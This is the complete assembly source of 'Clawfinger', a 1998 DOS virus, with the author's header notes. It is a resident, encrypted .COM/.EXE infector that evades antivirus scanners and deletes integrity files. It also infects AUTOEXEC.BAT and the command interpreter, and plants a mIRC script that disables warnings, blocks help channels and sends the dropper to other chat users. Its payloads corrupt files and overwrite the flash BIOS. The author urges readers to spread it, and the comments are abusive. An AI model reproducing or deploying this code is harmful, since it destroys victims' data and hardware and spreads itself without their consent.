;============================================================================
;
;
;     NAME: Clawfinger v1.03
;     TYPE: Resident DOS .COM & .EXE-infector + mIRC.
;     DATE: August - October 1998.
;   AUTHOR: T-2000 / [Invaders].
;   E-MAIL: T2000_@hotmail.com
;     SIZE: Approximately 2500 bytes.
;      CPU: 286+
;
;
;       - Installs a viral mIRC-script.
;       - Retro-functions in mIRC.
;       - Infects AUTOEXEC.BAT.
;       - Variable encrypting in files.
;       - Uses UMBs if available.
;       - Works with DOS 7 .COM-files.
;       - Payload: file-corruption and FLASH-BIOS trashing.
;       - Infects file pointed by COMSPEC-variable.
;       - Also infects runtime.
;       - Doesn't infect various AV-programs.
;
;
; Scanner detection:
;
;       - F-Prot 3.02           :       Undetectable.
;       - TBSCAN 8.07           :       Undetectable.
;       - NOD 7.24              :       Detectable.
;
;
; This is a resident fast DOS .COM & .EXE-infector, besides, it also infects
; C:\MIRC\MIRC.INI if available, so it will be able to spread over the IRC
; via mIRC-clients.
;
; Originally this used to be a full-stealth virus, but for some shitty
; reason, Winshit95 won't let us set our infected date, so it's impossible
; to check for infected files. My next virii will have this problem fixed.
;
; Infects on program execute (AX=4B00h), open (AH=3Dh), extended open
; (AX=6C00h), and file delete (AH=41h), doesn't infect overlays, works
; with PKZIP, uses an anti-emulation routine so dumb scanners like TBSCAN
; don't find a thing. First trigger (random) trashes all files in current-
; directory, second trashes FLASH-BIOS if available (September 1st, random).
;
;
; MIRC-STUFF:
;
; Clawfinger's way of infecting mIRC is much better/more compatible then
; all other mIRC-virii/worms I've seen, instead of overwriting the original
; SCRIPT.INI (SCRIPT.INI-worm), or replacing the original MIRC.INI (DMSETUP),
; this virus actually adds a new script to the file MIRC.INI, this way there
; will be no changes in any other files, so the user doesn't have to fill-in
; all the stuff again (nicks, e-mail, scripts, etc).
;
; The new added viral script has several phases of execution, called 'events'
; in the mIRC-scripting language. The first one will be called when mIRC
; starts, it will disable several auto-warnings, so mIRC doesn't yell when
; a suspicious action is going to take place. The 2nd event triggers when
; someone tries to send the infected user the drop-file of Clawfinger, this
; is not necessary as the user is already infected, so the send is canceled.
; The 3rd event (join) contains a retro-routine, it doesn't allow the user
; to join any channel with the word 'help' in it, (this matches most help
; channels, such as #help, #irchelp, #mirchelp, etc). Reason for this being
; that most ppl at IRC go to lame help-channels whenever they think they are
; infected with a worm, virus, trojan, Goodtimes, or even that new ebola
; strain just found in the jungle of South-America. Anyway, they won't get
; any help there anymore... (Hmmm... I could let the payload activate, but
; hey! I'm a nice guy!). The 4th events does the actual spreading, whenever
; a person leaves a channel the infected user is on, there is a 1/6 chance
; that the infection-timer will be started. This timer waits 60 seconds
; before it sends the dropper-file (most ppl know by experience that files
; sended to them the second they joined/leaved won't do any good). I included
; this random infection-trigger to prevent the DCC from flooding, this way
; the virus is also less noticable. Note that I didn't use the join-event to
; infect ppl, by only using the part-event I can make advantage of another
; stupidity of all those lame chatters, most of em are complete fucking
; morons who don't even know how to /QUERY someone, their brains are only
; capable of double-clicking at a nick... in other words, no more "what's
; this?" messages.
;
; Clawfinger was inspired by DMSETUP, much respect goes to the author of it,
; I would like to have a chat with him sometime.
;
;
; Some con's:
;
;       - mIRC-infection part is a bit hardcoded here & there, for example
;         Clawfinger cannot process MIRC.INI's > 8kb, coz it reads the whole
;         file at once instead of in chunks.
;
;       - Clawfinger also infects the DOS-stub of NE/PE-files, maybe it fucks
;         em up, maybe it doesn't, I never really cared about this Winshit-
;         crap. This virus is done, I'm too lazy to fix it.
;
;
; This baby runs fine on my system, if it doesn't on yours, or if you might
; find some bugs, please contact me on the IRC or give me a mail describing
; what the problem is.
;
;
; Spreading is encouraged, do so.
;
; Ah yes, Clawfinger is a swedisch metalband, for those who wanna know....
;
;
; Stay tune for my latest two ideas which haven't been turned into code yet:
; the 'nuke', and 'lethal-retro'-virus.
;
;
;
;                 "I love it when a plan comes together..."
;                              - The A-Team -
;
;============================================================================


                .MODEL  TINY
                .STACK  1024
                .286
                .CODE


Virus_Size      EQU     (Virus_End - $)
Virus_Size_Mem  EQU     ((Virus_Size * 2) + 256 + Chunk + 15) / 16
Res_Check       EQU     0BA16h
Marker_Mem      EQU     0D0D0h
Marker_File     EQU     0D00Dh
Chunk           EQU     8192            ; 8k.

;----------------------------------------------------------------------------

START:
                MOV     BP, SP                  ; Get our delta-offset, this
                INT     03h                     ; method isn't detected by
Delta_Ptr:      MOV     SI, [BP-6]              ; heuristics & also provides
                SUB     SI, (Delta_Ptr - Start) ; a simple anti-debug trick.

                PUSH    ES
                PUSHA

                MOV     BP, (OFFSET End_Encrypted - 1)
                MOV     CX, (End_Encrypted - Encrypted)

Decrypt_Byte:   XOR     BYTE PTR CS:[SI+BP], 00h
Key_File        =       BYTE PTR $-1

                MOV     AH, 3Eh                 ; Close non-existing handle,
                MOV     BH, 97h                 ; emulators mostly return
                INT     21h                     ; no errors, so we know when
                JC      Continue_Decr           ; being emulated.

                MOV     AX, 4C00h               ; Exit to DOS so scanners
                INT     21h                     ; think the file is clean.

Continue_Decr:  DEC     BP

                JMP     $+2                     ; Clear prefetcher.

                LOOP    Decrypt_Byte

Encrypted:      MOV     AX, Res_Check           ; Residency-check.
                INT     21h

                CMP     AX, Marker_Mem          ; Are we already TSR ?
                JNE     Make_TSR

                JMP     Exec_Host

Make_TSR:       MOV     AX, 5802h               ; Get UMB link state.
                INT     21h

                CBW                             ; Save state on stack.
                PUSH    AX

                MOV     AX, 5803h               ; Add UMBs to memory-chain.
                MOV     BX, 0001h
                INT     21h

                XOR     DI, DI

                MOV     AX, DS                  ; Get our MCB.
                DEC     AX

Find_Last_MCB:  MOV     DS, AX

                CMP     BYTE PTR DS:[DI], 'Z'   ; Last block in chain?
                JE      Found_Last_MCB

                INC     AX                      ; Calculate next block.
                ADD     AX, DS:[DI+3]

                JMP     Find_Last_MCB

Found_Last_MCB: XCHG    CX, AX

                MOV     AX, 5803h               ; Restore UMB-link state.
                POP     BX
                INT     21h

                MOV     AX, DS:[DI+3]           ; Get size in block.

                SUB     AX, Virus_Size_Mem      ; Subtract our needings.
                JC      Exec_Host               ; Not enough space in block?

                MOV     DS:[DI+3], AX           ; Put new size back in MCB.

                INC     AX                      ; Our new segment.
                ADD     AX, CX

                CMP     AX, DS:[DI+12h]         ; Are we in conventional or
                JNB     No_Adjust_PSP           ; UMB-memory?

                ; Necessary with Winshit95.

                SUB     DS:[DI+12h], Virus_Size_Mem

No_Adjust_PSP:  MOV     ES, AX                  ; ES = our new segment.

                PUSH    CS
                POP     DS

                CLD                             ; Copy us to our reserved
                MOV     CX, Virus_Size          ; memory.
                REP     MOVSB

                MOV     AX, OFFSET Relocated

                PUSH    ES                      ; JMP to relocated virus.
                PUSH    AX
                RETF

Relocated:      PUSH    CS
                POP     DS

                CALL    Get_Random              ; Initialise random generate,
                MOV     Init_Seed, AX           ; a bit redudant, whatever...

                MOV     AX, 3521h               ; Get address INT 21h.
                INT     21h

                MOV     Int21h, BX              ; Save address INT 21h.
                MOV     Int21h+2, ES

                MOV     AH, 25h                 ; Hook INT 21h.
                MOV     DX, OFFSET NewInt21h
                INT     21h

                CALL    Infect_Current_Dir      ; Infect current directory.

                CALL    Infect_mIRC             ; Infect mIRC and the
                                                ; AUTOEXEC.BAT. (stupid
                                                ; short labels!).

                CALL    Infect_ComSpec          ; Infect command-interpreter

                MOV     AH, 2Ah                 ; Get system date.
                INT     21h

                CMP     DX, 0901h               ; September 1st?
                JNE     No_BIOS_Trash

                CALL    Get_Random

                AND     AL, 10000001b           ; Don't destroy all hosts.
                JNZ     No_BIOS_Trash

                CALL    Trash_BIOS              ; Bye bye! hahahahaha!

No_BIOS_Trash:  POPA
                XOR     SI, SI                  ; Zero displacement.
                PUSHA

Exec_Host:      POPA                            ; Restore registers.
                POP     ES

                PUSH    CS
                POP     DS

                ADD     SI, OFFSET Host_Bytes

                CMP     [SI.EXE_Mark], 'ZM'     ; Check if our host is a
                JE      Exec_EXE                ; .COM or a .EXE-file.

                MOV     DI, 100h                ; Restore .COM in memory.
                PUSH    ES                      ; PUSH entrypoint .COM-host.
                PUSH    DI
                MOV     CX, (24 / 2)
                CLD
                REP     MOVSW

                PUSH    ES                      ; Restore DS.
                POP     DS

                XOR     SI, SI
                XOR     DI, DI

                RETF                            ; Pass control to host.


Payload_Msg     DB      'Clawfinger', 0Ah, 0Dh, '$'


Exec_EXE:       MOV     AX, ES
                ADD     AX, 10h

                ADD     [SI.Program_CS], AX     ; Add effective segment.
                ADD     AX, [SI.Program_SS]

                PUSH    ES
                POP     DS

                CLI                             ; Restore original stack.
                MOV     SS, AX
                MOV     SP, CS:[SI.Program_SP]
                STI

                XOR     AX, AX

                JMP     DWORD PTR CS:[SI.Program_IP]


; Inspired by CIH, ripped from VLAD.
Trash_BIOS:
                MOV     AX, 0E000h              ; Check if this computer has
                INT     16h                     ; a flash-BIOS.
                JC      Exit_Trash_BIOS

                CMP     AL, 0FAh                ; Double-check, just in case.
                JNE     Exit_Trash_BIOS

                MOV     AL, 05h                 ; Raise voltage.
                INT     16h

                MOV     AL, 07h                 ; Enable writes.
                INT     16h

                MOV     BX, 0F000h              ; BIOS
                MOV     ES, BX

                XOR     DI, DI                  ; Overwrite large part of
                MOV     CX, (0FFFEh / 2)        ; ROM with garbage.
                CLD
                REP     STOSW

Exit_Trash_BIOS:

                RETN


Copyright   DB      '=[ Clawfinger v1.03, (c) 1998 by T-2000 / Invaders ]='



; Returns a random number in AX.
Get_Random:
                PUSH    BX

                IN      AX, 40h
                RCL     AX, 1
                NEG     AX

                XCHG    BX, AX

                IN      AX, 40h
                ADD     AX, BX

                XOR     AX, 0000h
Init_Seed       =       WORD PTR $-2

                POP     BX

                RETN


Hook_Int24h:
                PUSH    CS
                POP     DS

                MOV     AX, 3524h               ; Get address INT 24h.
                CALL    OldInt21h

                MOV     AH, 25h                 ; Install dummy critical-
                MOV     DX, OFFSET NewInt24h    ; error-handler.
                CALL    OldInt21h

                RETN



NewInt24h:
                MOV     AL, 03h
                IRET


; === Converts AX to uppercase. ===
Make_Uppercase:

                CMP     AL, 'a'
                JB      Make_Up_AH

                CMP     AL, 'z'
                JA      Make_Up_AH

                SUB     AL, 'a' - 'A'

Make_Up_AH:     CMP     AH, 'a'
                JB      Exit_Make_Upper

                CMP     AH, 'z'
                JA      Exit_Make_Upper

                SUB     AH, 'a' - 'A'

Exit_Make_Upper:

                RETN



NewInt21h:
                CMP     AH, 3Dh                 ; Open file (handle).
                JE      Check_Infect

                CMP     AX, 6C00h               ; Extended open.
                JE      Check_Infect

                CMP     AX, 4B00h               ; Execute program.
                JE      Check_Infect

                CMP     AH, 41h                 ; Delete file.
                JE      Check_Infect

                CMP     AX, Res_Check           ; Are-You-There-call.
                JNE     JMP_Int21h

Return_Marker:  MOV     AX, Marker_Mem

                IRET

JMP_Int21h:     JMP     DWORD PTR CS:Int21h     ; JMP to INT 21h chain.


                DB      'Crush your enemies!', 0


Check_Infect:
                PUSHA
                PUSH    DS
                PUSH    ES

                PUSH    AX
                PUSH    DX
                PUSH    DS

                CALL    Hook_Int24h

                POP     DS
                POP     DX
                POP     CX

                PUSH    BX
                PUSH    ES

                CALL    Save_File_Attr
                JNC     File_Exists

                JMP     Exit_Infect_2

        ; Check if the current program executing is PKZIP, and don't infect
        ; any files if so. This is done coz else PKZIP will fuck up the
        ; filesize.

File_Exists:    MOV     AH, 62h                 ; Get PSP of current process.
                CALL    OldInt21h

                DEC     BX                      ; Get MCB.
                MOV     ES, BX

                MOV     AX, ES:[8]              ; 1st word executing program.
                CALL    Make_Uppercase

                CMP     AX, 'KP'                ; PKZIP ?
                JE      JMP_Exit_Inf

                CMP     CX, 6C00h               ; Extended open?
                JNE     No_Ext_Open             ; Then set correct register.

                MOV     DX, SI                  ; DS:DX = ASCIIZ-string.

No_Ext_Open:    PUSH    DS                      ; ES=DS.
                POP     ES

                XOR     AL, AL                  ; Find end of ASCIIZ-string.
                MOV     DI, DX
                CLD
                REPNZ   SCASB

                DEC     DI                      ; DI = ASCIIZ.

                MOV     AX, [DI-2]              ; Get last word of extension.
                CALL    Make_Uppercase

                CMP     AX, 'MO'                ; Has file .COM-extension?
                JE      Extension_OK

                CMP     AX, 'EX'                ; Has file .EXE-extension?
                JNE     JMP_Exit_Inf

Extension_OK:   MOV     AL, '\'                 ; Find start of filename.
                MOV     CX, 14
                STD
                REPNE   SCASB

                CLD

                INC     DI                      ; DI = start filename.
                INC     DI

                CMP     DI, DX                  ; Went past offset filename?
                JNB     Found_Filename

                MOV     DI, DX                  ; Else there is no path.

Found_Filename: MOV     AX, [DI]                ; Get 1st word of filename.
                CALL    Make_Uppercase

                XCHG    BX, AX

                MOV     SI, OFFSET No_Infect_Table

Comp_Filename:  LODS    WORD PTR CS:[SI]        ; Get next word from table.

                OR      AX, AX                  ; End of table?
                JZ      Filename_OK

                CMP     AX, BX                  ; Does the filename match?
                JE      JMP_Exit_Inf

                JMP     Comp_Filename

Filename_OK:    MOV     AX, 3D92h               ; Open candidate file.
                CALL    OldInt21h
                JNC     File_Opened

JMP_Exit_Inf:   JMP     Exit_Infect

File_Opened:    XCHG    BX, AX                  ; BX = filehandle.

                MOV     AX, 4400h               ; Get IOCTL information.
                CALL    OldInt21h

                TEST    DL, 10000000b           ; Filehandle?
                JNE     Abort_Check

                PUSH    CS
                POP     DS

                PUSH    CS
                POP     ES

                MOV     DX, OFFSET TBAV_CRC_File
                CALL    Save_File_Attr
                JC      Read_Header

                MOV     AH, 41h                 ; Delete ANTI-VIR.DAT.
                CALL    OldInt21h

Read_Header:    MOV     SI, OFFSET Header

                MOV     AH, 3Fh                 ; Read header.
                MOV     CX, 24
                MOV     DX, SI
                CALL    OldInt21h
                JC      Abort_Check

                CMP     AX, CX                  ; File smaller then 24 bytes?
                JNE     Abort_Check

                CMP     [SI.Checksum], Marker_File  ; File already infected?
                JE      Abort_Check

                MOV     AX, 4202h               ; Go to position of possible
                MOV     CX, -1                  ; ENUNS-checksum.
                MOV     DX, -7
                CALL    OldInt21h

                MOV     AH, 3Fh                 ; Read possible ENUNS-block.
                MOV     CX, 7
                MOV     DX, OFFSET ENUNS_Block
                CALL    OldInt21h

                ADD     ENUNS_Block.ENUNS_Checksum, Virus_Size

                CMP     [SI.EXE_Mark], 'ZM'     ; Host is a .COM or .EXE ?
                JE      Mark_As_EXE

Mark_As_COM:    CALL    Go_EOF

                OR      DX, DX                  ; .COM is bigger then 64k ?
                JNZ     Abort_Check

                CMP     AX, (65535 - (Virus_Size + 1024))
                JB      Infect_File

                JMP     Abort_Check

Mark_As_EXE:    ; Check if the file has internal overlays.

                CALL    Calc_512_Pages

                CMP     AX, [SI.Image_512_Pages]
                JNE     Abort_Check

                CMP     DX, [SI.Image_Mod_512]
                JNE     Abort_Check

                CMP     AX, (1024 / 512)        ; .EXE-file is big enough?
                JNB     Infect_File

Abort_Check:    JMP     Close_File

Infect_File:    CALL    Save_File_Stamp

                PUSH    SI

                CLD                             ; Save header.
                MOV     DI, OFFSET Host_Bytes
                MOV     CX, (24 / 2)
                CLD
                REP     MOVSW

Get_Key_File:   CALL    Get_Random              ; Get encryption-key.
                JZ      Get_Key_File            ; Avoid zero-encryption.

                MOV     Key_File, AL

                XOR     SI, SI                  ; Copy virus to buffer for
                MOV     DI, OFFSET Buffer       ; encryption.
                MOV     BP, DI
                MOV     CX, Virus_Size
                REP     MOVSB

                LEA     SI, [BP+(Encrypted-Start)]
                MOV     CX, (End_Encrypted-Encrypted)

Encrypt_Byte:   XOR     [SI], AL                ; Encrypt virus in buffer.
                INC     SI
                LOOP    Encrypt_Byte

                POP     SI

                CALL    Go_EOF

                PUSH    AX                      ; Save hostsize on stack.
                PUSH    DX

                MOV     CX, Virus_Size          ; Append virusbody.
                MOV     DX, BP                  ; OFFSET Buffer
                CALL    Write_File

                CMP     [SI.EXE_Mark], 'ZM'     ; Host is a .COM or .EXE ?
                JE      Infect_EXE

Infect_COM:     POP     DX                      ; DX:AX = hostsize.
                POP     AX

                SUB     AX, 3                   ; Minus displacement.

                MOV     [SI.Jump], 0E9h         ; 16-Bit JMP opcode.
                MOV     [SI.Displacement], AX

                JMP     Set_Header

Infect_EXE:     MOV     AX, [SI.Headersize_Para]; Calculate headersize.
                MOV     CX, 16
                MUL     CX

                MOV     DI, DX                  ; DI:CX = headersize.
                XCHG    CX, AX

                POP     DX
                POP     AX

                SUB     AX, CX                  ; Filesize - headersize.
                SBB     DX, DI

                MOV     CX, 16                  ; Calculate virus' new CS:IP.
                DIV     CX

                MOV     [SI.Program_CS], AX     ; Set virus' new CS:IP.
                MOV     [SI.Program_IP], DX

                INC     AX                      ; Anti-heuristic.

                MOV     [SI.Program_SS], AX
                MOV     [SI.Program_SP], (Virus_Size_Mem * 16) + (1024 - 16)

                ADD     [SI.Min_Mem_Para], Virus_Size_Mem + (1024 / 16)

                CALL    Calc_512_Pages

                MOV     [SI.Image_512_Pages], AX
                MOV     [SI.Image_Mod_512], DX

Set_Header:     MOV     [SI.Checksum], Marker_File

                CALL    Go_BOF

                MOV     CL, 24                  ; Write updated header.
                MOV     DX, SI
                CALL    Write_File

                CALL    Restore_File_Stamp

                INC     Infects                 ; We've did another one.

Close_File:     MOV     AH, 3Eh                 ; Close file.
                CALL    OldInt21h

Exit_Infect:    CALL    Restore_File_Attr

Exit_Infect_2:  MOV     AX, 2524h               ; Restore original INT 24h.
                POP     DS
                POP     DX
                CALL    OldInt21h

                POP     ES
                POP     DS
                POPA

                JMP     JMP_Int21h


Protect_File:
                MOV     AX, 4301h               ; Make readonly/hidden.
                MOV     CX, 00000011b
                JMP     OldInt21h


Save_File_Attr:
                PUSHA

                MOV     CS:File_Name, DX        ; Save address filename.
                MOV     CS:File_Name+2, DS

                MOV     AX, 4300h               ; Get file-attributes of
                CALL    OldInt21h               ; the file.
                JC      Exit_File_Attr

                MOV     CS:File_Attr, CX        ; Save file-attributes.

                MOV     AX, 4301h               ; Clear readonly-flag.
                AND     CL, NOT 00000001b
                CALL    OldInt21h

Exit_File_Attr: POPA

                RETN


Restore_File_Attr:

                PUSHA
                PUSH    DS

                MOV     AX, 4301h
                MOV     CX, 0000h
File_Attr       =       WORD PTR $-2
                LDS     DX, DWORD PTR CS:File_Name
                CALL    OldInt21h

                POP     DS
                POPA

                RETN


Go_BOF:
                MOV     AX, 4200h
                JMP     Set_Pos

Go_EOF:
                MOV     AX, 4202h
Set_Pos:        XOR     CX, CX
                CWD

OldInt21h:      PUSHF
                CALL    DWORD PTR CS:Int21h

                RETN


Infect_ComSpec:
                MOV     DX, OFFSET Winshit_COM  ; Hardcoded, who cares...
                CALL    Touch_File

                XOR     DI, DI

                MOV     AX, 6200h               ; Get PSP and clear AL.
                INT     21h

                MOV     ES, BX                  ; Get program settings.
                MOV     ES, ES:[DI+2Ch]

Find_ComSpec:   CMP     ES:[DI], AL             ; End of settings?
                JZ      Exit_Inf_ComSpec

                PUSH    DI

                MOV     SI, OFFSET ComSpec
                MOV     CX, (8 / 2)
                CLD
                REPE    CMPSW

                POP     DI

                JE      Found_ComSpec

                MOV     CH, 0FFh                ; Find next setting.
                CLD
                REPNZ   SCASB

                JMP     Find_ComSpec

Found_ComSpec:  PUSH    ES
                POP     DS

                LEA     DX, [DI+8]              ; Infect the command-
                CALL    Touch_File              ; interpreter.

Exit_Inf_ComSpec:

                RETN


Calc_512_Pages:
                CALL    Go_EOF                  ; Get filesize.

                MOV     CH, 02h                 ; Divide in 512-byte pages.
                DIV     CX

                OR      DX, DX                  ; Remainder?
                JZ      No_Round

                INC     AX                      ; Then round upwards.

No_Round:       RETN


; Accesses a file with our hooked INT 21h so the virus will infect it.
Touch_File:
                PUSH    DS

                PUSH    CS
                POP     DS

                PUSH    CS
                POP     ES

                MOV     SI, OFFSET Host_Bytes
                MOV     DI, OFFSET Temp_Buffer
                MOV     CX, (24 / 2)
                CLD
                REP     MOVSW

                POP     DS

                MOV     AX, 3D00h               ; Open file via hooked INT.
                INT     21h
                JC      End_Touch_File

                XCHG    BX, AX                  ; BX = filehandle.

                MOV     AH, 3Eh                 ; Close file.
                INT     21h

End_Touch_File: PUSH    CS
                POP     DS

                MOV     SI, OFFSET Temp_Buffer
                MOV     DI, OFFSET Host_Bytes
                MOV     CL, (24 / 2)
                CLD
                REP     MOVSW

                RETN



Infect_Current_Dir:

                PUSH    DS
                PUSH    ES

                MOV     AH, 2Fh                 ; Get DTA-address.
                INT     21h

                PUSH    BX
                PUSH    ES

                MOV     AH, 1Ah                 ; Set our own DTA.
                MOV     DX, OFFSET New_DTA
                INT     21h

                MOV     AH, 4Eh                 ; Findfirst file, (CX=0000h).
                MOV     DX, OFFSET File_Spec
                INT     21h
                JC      Restore_DTA

                MOV     Infects, CL
                MOV     DX, OFFSET New_DTA + 1Eh

                CALL    Get_Random
                XCHG    BP, AX

Infect_Find:    OR      BP, BP                  ; Random activation?
                JNZ     Skip_Damage

                MOV     AX, 3D92h               ; Open file for r/w.
                INT     21h
                JC      Trash_Loop

                PUSHA

                XCHG    BX, AX

                MOV     AH, 09h                 ; Display the virusname to
                MOV     DX, OFFSET Payload_Msg  ; give the AV'ers a hint.
                INT     21h

                MOV     CX, 666                 ; Overwrite first 666 bytes
                INT     21h                     ; of file with garbage.
                CALL    Write_File

                XOR     CX, CX                  ; Cut-off file at 666 bytes.
                CALL    Write_File

                MOV     AX, 5701h               ; Zero filedate & time.
                CWD
                INT     21h

                MOV     AH, 3Eh                 ; Close fucked file.
                INT     21h

                POPA

                JMP     Trash_Loop

Skip_Damage:    CMP     Infects, 5              ; Don't infect more then 5.
                JAE     Restore_DTA

                CALL    Touch_File              ; Infect the fucker.

Trash_Loop:     MOV     AH, 4Fh                 ; Findnext file.
                INT     21h
                JNC     Infect_Find

Restore_DTA:    MOV     AH, 1Ah                 ; Restore original DTA.
                POP     DS
                POP     DX
                INT     21h

                POP     ES
                POP     DS

                RETN


;-----------------------------------------------
; Adds a new remote-script to MIRC.INI and puts
; a infected dropper in the mIRC-directory.
;-----------------------------------------------
Infect_mIRC:
                CALL    Hook_Int24h

                PUSH    BX
                PUSH    ES

                PUSH    CS
                POP     ES

                MOV     AH, 5Bh                 ; Create virusscript-file.
                XOR     CX, CX
                MOV     DX, OFFSET Vir_Script_Name
                INT     21h
                JC      JC_Exit_Inf             ; Already installed?

                PUSH    DX

                XCHG    BX, AX

                ; Write virusscript to file.

                MOV     CX, (End_Virus_Script - Virus_Script)
                MOV     DX, OFFSET Virus_Script
                CALL    Write_File

                MOV     AH, 3Eh                 ; Close virusscript-file.
                INT     21h

                ; Make readonly & hidden.

                POP     DX                      ; OFFSET Vir_Script_Name
                CALL    Protect_File

                ; Create binary virusdropper.

                MOV     DX, OFFSET Dropper_Name
                CALL    Create_Dropper
                JC      JC_Exit_Inf

                ; === Infect mIRC MIRC.INI datafile. ===

                MOV     DX, OFFSET MIRC_INI
                CALL    Save_File_Attr
                JC      Infect_Autoexec_Bat

                MOV     AX, 3D92h               ; Open MIRC.INI file for
                INT     21h                     ; reading/writing.
JC_Exit_Inf:    JC      Infect_Autoexec_Bat

                XCHG    BX, AX                  ; BX = filehandle.

                MOV     AH, 3Fh                 ; Read MIRC.INI file.
                MOV     CX, Chunk
                MOV     DX, OFFSET Buffer
                INT     21h

                CMP     AX, CX                  ; File too large for our
                JNB     Close_File_mIRC         ; buffer?

                XCHG    BP, AX

                MOV     DI, DX                  ; DI = offset Buffer.

Find_rfiles:    PUSH    DI

                MOV     SI, OFFSET rfiles
                MOV     CX, (8 / 2)
                CLD
                REPE    CMPSW

                POP     DI

                INC     DI

                LEA     AX, [BP+Buffer]

                CMP     DI, AX                  ; Not here?
                JA      Close_File_mIRC

                OR      CX, CX                  ; '[rfiles]' found?
                JNZ     Find_rfiles

                MOV     AL, '['                 ; Find next settings,
                MOV     CH, 0FFh                ; thus end of [rfiles].
                CLD
                REPNE   SCASB

                MOV     AL, '='                 ; Find last item.
                MOV     CH, 0FFh
                STD
                REPNE   SCASB

                CLD

                MOV     AL, [DI]                ; Get "last" script-number.
                INC     AX                      ; Calculate our script#.

                CMP     AL, '9'                 ; Safety-check, coz this
                JA      Close_File_mIRC         ; routine is a bit hardcoded.

                MOV     BYTE PTR Define_Script+1, AL

                MOV     AX, 0A0Dh               ; <CR> & <LF>.

Find_End:       DEC     DI                      ; Find end

                SCASW
                JNE     Find_End

                MOV     AX, 4200h               ; Go to position where we
                XOR     CX, CX                  ; insert our virus-script
                LEA     DX, [DI-(Buffer-Start)] ; declaration.
                INT     21h

                CALL    Save_File_Stamp

                ; Write our virusscript-declaration.

                MOV     CX, (End_Define_Script - Define_Script)
                MOV     DX, OFFSET Define_Script
                CALL    Write_File

                ; Append rest of original MIRC.INI file.

                LEA     CX, [Buffer+BP]
                SUB     CX, DI
                MOV     DX, DI
                CALL    Write_File

                CALL    Restore_File_Stamp

Close_File_mIRC:

                MOV     AH, 3Eh                 ; Close file.
                INT     21h

                CALL    Restore_File_Attr


        ; === Add a reference to a dropper in the AUTOEXEC.BAT. ===

Infect_Autoexec_Bat:

                ; Create a infected dropper in the root.

                MOV     DX, OFFSET Autoexec_File
                CALL    Create_Dropper
                JC      Exit_Inf_Auto

                MOV     AX, 3D91h               ; Open AUTOEXEC.BAT for
                MOV     DX, OFFSET Autoexec_Bat ; writing.
                INT     21h
                JC      Exit_Inf_Auto

                XCHG    BX, AX

                CALL    Go_EOF

                MOV     CL, 3                   ; Append call to dropper.
                MOV     DX, OFFSET Call_Dropper
                CALL    Write_File

                MOV     AH, 3Eh                 ; Close AUTOEXEC.BAT.
                INT     21h

Exit_Inf_Auto:  MOV     AX, 2524h               ; Restore original INT 24h.
                POP     DS
                POP     DX
                JMP     OldInt21h


Create_Dropper:
                ; Create binary virusdropper.

                MOV     AH, 5Bh
                XOR     CX, CX
                INT     21h
                JC      Exit_Create_Dropper

                PUSH    DX

                XCHG    BX, AX

                ; Write uninfected dropper-file.

                MOV     CL, (End_Dropper - Dropper)
                MOV     DX, OFFSET Dropper
                CALL    Write_File

                MOV     AH, 3Eh                 ; Close dropper.
                INT     21h

                POP     DX                      ; OFFSET Dropper_Name
                CALL    Protect_File

                CALL    Touch_File              ; Infect the fucker.

                CLC

Exit_Create_Dropper:

                RETN


Save_File_Stamp:

                MOV     AX, 5700h
                CALL    OldInt21h

                MOV     CS:File_Time, CX
                MOV     CS:File_Date, DX

                RETN


Restore_File_Stamp:

                MOV     AX, 5701h
                MOV     CX, 0000h
File_Time       =       WORD PTR $-2
                MOV     DX, 0000h
File_Date       =       WORD PTR $-2
                JMP     OldInt21h


Write_File:
                MOV     AH, 40h
                JMP     OldInt21h

; Dropper file which will be infected by the virus, and passed over mIRC.
Dropper:
                NOP
                INT     20h

                DB      'Enter password: ', '$'
                DB      '0123456789ABCDEF'

End_Dropper:

                ; Cops/AVers.

                DB      'Fuck the pigs!', 0

Winshit_COM     DB      'C:\WINDOWS\WIN.COM', 0

TBAV_CRC_File   DB      'ANTI-VIR.DAT', 0

Vir_Script_Name DB      'C:\MIRC\MIRC_SYS.INI', 0
Dropper_Name    DB      'C:\MIRC\CYBER.COM', 0
MIRC_INI        DB      'C:\MIRC\MIRC.INI', 0
rfiles          DB      '[rfiles]'

                DB      'Coded-Sep-Oct-1998', 0


Define_Script:
                DB      'n#=mirc_sys.ini', 0Dh, 0Ah
End_Define_Script:


Virus_Script:
                DB      '[script]', 0Dh, 0Ah
                DB      'n0=on *:start: { .writeini $mircini warn fserve off | .writeini $mircini warn dcc off | .writeini $mircini fileserver Warning Off | .sreq -m auto | .saveini }', 0Dh, 0Ah
                DB      'n1=ctcp *:dcc send:*: { if ($3 == cyber.com) { .halt } }', 0Dh, 0Ah
                DB      'n2=on *:join:#: { if (help isin $chan) { .part $chan } }', 0Dh, 0Ah
                DB      'n3=on !*:part:#: { if ($rand(0, 5) == 0) { .timer 1 60 { .dcc send $nick c:\mirc\cyber.com } } }', 0Dh, 0Ah
End_Virus_Script:


No_Infect_Table DW      'BT'    ; ThunderByte utilities.
                DW      '-F'    ; F-Prot.
                DW      'CS'    ; SCAN.
                DW      'VI'    ; Invircible utilities.
                DW      'IF'    ; FINDVIRU.
                DW      'MI'    ; Integrity Master.
                DW      'IV'    ; VIRSCAN, VIRUSCAN.
                DW      'AN'    ; NAV.
                DW      'ON'    ; NOD-Ice.
                DW      'VA'    ; AVP.
                DW      0       ; (No girafe in here, hehe).


Autoexec_Bat    DB      'C:\AUTOEXEC.BAT', 0
Autoexec_File   DB      'C:\', 255, '.COM', 0

Call_Dropper    DB      255, 0Dh, 0Ah

ComSpec         DB      'COMSPEC='
File_Spec       DB      '*.*', 0


Warfair         DB      'Do you know how it feels to be down in the dirt '
                DB      'with a bullet in yer breast and blood on yer shirt '
                DB      'Lying in a bloodpool down in a pit '
                DB      'covered with the corpse and the blood and the shit '
                DB      'How does it feel to have a gun at yer head '
                DB      'when ya know that you''d be much better off dead '
                DB      'Freedom has a price and that price is blood '
                DB      'so chase the motherfucker right down in da mud ', 0

                DB      '[ WARFAIR - CLAWFINGER ]'


; Original bytes of host.
Host_Bytes      DW      'ZM'
                DW      0
                DW      0
                DW      0
                DW      0
                DW      0
                DW      0
                DW      0
                DW      0
                DW      0
                DW      OFFSET Carrier
                DW      0
End_Encrypted:

ENUNS_Block     DB      7 DUP(0)

Virus_End:

Header          DB      24 DUP(0)

Temp_Buffer     DB      24 DUP(0)

Int21h          DW      0, 0
Int24h          DW      0, 0

Infects         DB      0
File_Name       DW      0, 0

New_DTA         DB      128 DUP(0)

Buffer:


;-------------- VARIOUS STRUCTURES ------------------------------------------

COM_Header      STRUC
Jump            DB      0
Displacement    DW      0
COM_Header      ENDS


EXE_Header      STRUC
